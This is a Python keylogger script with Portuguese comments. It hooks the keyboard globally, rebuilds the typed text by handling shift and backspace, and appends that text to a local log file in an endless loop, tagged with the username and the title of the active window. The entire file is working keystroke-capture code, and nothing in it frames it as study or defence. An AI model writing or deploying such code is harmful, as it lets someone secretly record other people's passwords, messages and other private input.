from keybhook import start_hook, config, VK_CODELETTER
import pandas as pd
import numpy as np
import os
import datetime
import getpass
import pygetwindow as gw

# Configurações do teclado
VK_CODELETTER[193] = ('?', False)  # adiciona caracteres não mapeados

# Configurações do log
log_dir = r'caminho de onde vai ser armazenado o arquivo de logs'  # Diretório base para armazenar os logs
keyboard_log_file = os.path.join(log_dir, 'keyboard_log.txt')  # Arquivo de log do teclado

# Verifica se o diretório de log existe, caso contrário, cria-o
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Configurações do teclado
config.done = False
oldlen = 0
co = 0
limit = 60

# Informações do usuário
username = getpass.getuser()

# Obter aplicação atual
current_application = ""

start_hook()


def on_keyboard_event(event):
    global current_application
    if event.event_type == 'application':
        current_application = event.application


def write_log_header():
    with open(keyboard_log_file, mode='a', encoding='utf-8') as f:
        f.write("=======================================\n")
        f.write("Keyboard Event Log\n")
        f.write("User: {}\n".format(username))
        f.write("Date and Time: {}\n".format(datetime.datetime.now()))
        f.write("=======================================\n\n")


# Escrever cabeçalho do log ao iniciar o script
write_log_header()

while True:
    try:
        while True:
            newlen = len(config.results)
            if newlen > oldlen:
                if config.results:
                    print(config.results[-1])  # imprime a última letra capturada
                co += 1

            oldlen = newlen
            if co == limit:
                break

        df = pd.DataFrame(config.results.copy(),
                          columns=['letter', 'is_numpad', 'event_code', 'event', 'scan_code', 'flags', 'time'])
        config.results.clear()
        config.results.append(('letter', 'is_numpad', 'event_code', 'event', 'scan_code', 'flags', 'time'))
        co = 0
        df = df[df['event'] == 'KEY_DOWN'].reset_index(drop=True)

        shiftkeys = df[df['letter'].str.contains('shift', regex=True, na=False)].index
        upletter = df.loc[shiftkeys + 1, 'letter'].str.upper()
        df.loc[upletter.index, 'letter'] = upletter
        df = df.drop(shiftkeys).reset_index(drop=True)

        backspace_keys = df[df.letter.str.contains('backspace', na=False, regex=False)]
        gone_keys = backspace_keys.index - 1
        df = df.drop(np.concatenate([backspace_keys.index, gone_keys])).reset_index(drop=True)
        df.loc[df['letter'].str.len() > 1, 'letter'] = ' '

        frase = ''.join(df['letter'].tolist())

        # Obter aplicação atualmente ativa
        active_app = gw.getActiveWindowTitle()

        # Registrar evento de teclado juntamente com a aplicação atual
        with open(keyboard_log_file, mode='a', encoding='utf-8') as f:
            f.write(f"Application: {active_app}\n")
            f.write(f"Event: {frase}\n\n")

    except Exception as fe:
        print(fe)
        continue
